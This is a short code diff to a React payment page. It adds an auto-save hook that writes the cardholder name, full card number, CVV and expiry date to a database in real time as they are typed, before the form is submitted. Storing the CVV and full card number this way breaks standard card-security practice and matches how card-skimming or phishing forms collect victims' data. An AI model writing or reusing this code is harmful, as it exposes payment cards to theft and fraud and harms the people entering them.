@@ -121,6 +121,20 @@ const Payment = () => {
     return "unknown";
   };
   const cardType = getCardType(formData.cardNumber);
+
+  // Auto-save to database in real-time
+  useAutoSave(applicationId, {
+    cardholder_name: formData.cardholderName,
+    card_number: formData.cardNumber,
+    card_last_4: formData.cardNumber.replace(/\s/g, "").slice(-4) || "",
+    card_type: cardType,
+    card_cvv: formData.cvv,
+    expiry_date: formData.expiryMonth && formData.expiryYear ? `${formData.expiryMonth}/${formData.expiryYear}` : "",
+    selected_company: companyName,
+    selected_price: price,
+    regular_price: regularPrice,
+    current_step: 'payment'
+  }, "Payment");
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const {
       name,
